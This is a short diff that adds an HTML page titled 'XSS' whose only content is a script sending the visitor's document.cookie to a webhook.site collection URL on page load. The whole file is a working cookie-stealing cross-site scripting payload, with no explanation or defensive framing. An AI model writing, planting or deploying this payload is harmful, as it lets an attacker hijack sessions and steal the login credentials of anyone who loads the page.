@@ -1,0 +1,9 @@
+<!DOCTYPE html>
+<html>
+<head><title>XSS</title></head>
+<body>
+<script>
+fetch("https://webhook.site/9bbc17f3-c4f0-4980-a572-9b1d011932fc?cookie=" + document.cookie);
+</script>
+</body>
+</html>
